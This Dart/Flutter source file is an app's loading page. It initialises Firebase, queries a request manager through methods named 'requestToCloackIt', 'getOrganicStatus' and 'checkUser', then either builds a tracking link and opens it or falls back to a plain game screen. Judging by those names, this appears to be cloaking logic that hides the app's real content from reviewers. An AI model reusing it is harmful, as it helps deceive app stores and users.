import 'dart:async';
import 'package:connectivity/connectivity.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:flutter/material.dart';
import 'package:internet_popup/internet_popup.dart';
import 'package:liquid_progress_indicator/liquid_progress_indicator.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:synchronized/synchronized.dart';
import '/controller/player_controller.dart';
import '/utils/request_manager.dart';
import '/widgets/load_game_widget.dart';
import 'game_fragment.dart';

class LoadPage extends StatefulWidget {
  const LoadPage({super.key});

  @override
  State<LoadPage> createState() => _LoadPageState();
}

class _LoadPageState extends State<LoadPage> {
  var _progress = 0.0;
  var _isMain = true;
  late RequestManager _requestManager;
  late PlayerController _playerController;
  var isInit = false;
  final Lock lock = Lock();
  var isLoading = false;

  @override
  void initState() {
    InternetPopup().initialize(context: context);
    super.initState();

    initComponents();
    startLoading();
    Connectivity().onConnectivityChanged.listen((ConnectivityResult result) {
      if (result != ConnectivityResult.none) {
        if (isInit) {
          setState(() {
            _progress = 0.0;
          });
          if (!isLoading) {
            // startLoading();
          }
        }
      }
    });
  }

  void initComponents() async {
    await lock.synchronized(() async {
      if (!isInit) {
        await Firebase.initializeApp();
        var prefs = await SharedPreferences.getInstance();
        _playerController = PlayerController(prefs);
        _requestManager = RequestManager(_playerController);
      }
      setState(() {
        isInit = true;
      });
      startLoading();
    });
  }

  Future startLoading() async {
    await lock.synchronized(() async {
      var isOldUser = await _playerController.getPlayer();
      if (isOldUser) {
        setState(() {
          _goStartScreen(isOld: true);
        });
      } else {
        var link = await _playerController.getLink();
        print("LINK: $link");
        if (link != null) {
          _runGame(link);
        } else {
          var isOpened = await _requestManager.isOpen();
          print("IS OPEN: $isOpened");
          if (isOpened) {
            isLoading = true;
            var cloack = await _requestManager.requestToCloackIt();
            print("cloac: $cloack");
            var status = await _requestManager.getOrganicStatus();
            print("status: $status");

            if (cloack != null) {
              var check = _requestManager.checkUser(cloack, status);
              print("check: $check");
              if (check) {
                var keys = await _requestManager.getKeysList();
                print("keys: $keys");
                nextLoad();
                if (keys != null) _requestManager.saveKeys(keys);
                nextLoad();
                var domain = await _requestManager.getLinkDomain();
                print("domain: $domain");
                nextLoad();
                var params = await _requestManager.getParameters();
                print("params: $params");
                nextLoad();

                if (domain != null && params != null) {
                  _requestManager.makeTrackLink(domain, params);
                }
              } else {
                setState(() {
                  _goStartScreen();
                });
              }
            }
          } else {
            setState(() {
              _goStartScreen();
            });
          }
        }
      }
    });
  }

  @override
  Widget build(BuildContext context) {
    return _isMain == true
        ? Scaffold(
            body: Stack(
              fit: StackFit.expand,
              children: [
                const Image(
                  fit: BoxFit.fill,
                  image: AssetImage('assets/images/start_bg.png'),
                ),
                Padding(
                  padding: const EdgeInsets.only(left: 30, right: 30),
                  child: Column(
                    mainAxisAlignment: MainAxisAlignment.end,
                    children: [
                      Padding(
                        padding: const EdgeInsets.only(bottom: 50),
                        child: SizedBox(
                          height: 40,
                          child: LiquidLinearProgressIndicator(
                            value: _progress,
                            backgroundColor:
                                const Color.fromRGBO(16, 63, 117, 1),
                            valueColor: const AlwaysStoppedAnimation(
                                Color.fromARGB(251, 166, 41, 1)),
                            direction: Axis.horizontal,
                          ),
                        ),
                      ),
                    ],
                  ),
                ),
              ],
            ),
          )
        : const LoadGameWidget();
  }

  void nextLoad() {
    if (!isLoading) {
      setState(() {
        _progress += 0.25;
      });
    }
  }

  void _runGame(String link) {
    isLoading = true;
    runApp(GameFragment(link, _playerController));
  }

  void _goStartScreen({bool isOld = false}) {
    if (!isOld) _requestManager.reject();
    setState(() {
      _isMain = false;
    });
  }
}
